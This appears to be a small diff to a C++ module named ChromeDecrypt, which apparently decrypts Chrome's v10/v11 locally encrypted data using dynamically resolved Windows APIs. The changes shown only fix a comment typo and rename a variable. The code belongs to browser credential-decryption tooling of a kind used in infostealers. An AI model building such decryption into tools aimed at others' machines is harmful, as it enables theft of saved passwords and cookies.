@@ -43,7 +43,7 @@ bool ChromeDecrypt::decrypt(const String& encrypted, String& decrypted, int size
 		(encrypted[0] == 'v' && encrypted[1] == '1' && encrypted[2] == '1'))
 	{
 		//The encrypted data in this case start with the ASCII encoding of v10/v11 
-		//followed by the 12 bytes nonce, the actual ciphertext and finally the 16 bytesa uthentication tag.
+		//followed by the 12 bytes nonce, the actual ciphertext and finally the 16 bytes authentication tag.
 
 		ULONG cbOutput = MAX_SIZE;
 		ULONG cbCiphertext = 0;
@@ -199,13 +199,13 @@ cJSON* ChromeDecrypt::findNode(cJSON* node, const char* key)
 
 String ChromeDecrypt::getAppFolder(int CSIDL_FLAG)
 {
-	const auto get_userPath = WinApiImport<f_SHGetFolderPathA>::get("SHGetFolderPathA", "shell32.dll");
+	const auto userPath = WinApiImport<f_SHGetFolderPathA>::get("SHGetFolderPathA", "shell32.dll");
 
-	if (!get_userPath) 
+	if (!userPath)
 		return {};
 	char path[MAX_PATH];
 
-	if (get_userPath(NULL, CSIDL_FLAG, NULL, 0, path) != S_OK)
+	if (userPath(NULL, CSIDL_FLAG, NULL, 0, path) != S_OK)
 		return "";
 
 	return path;
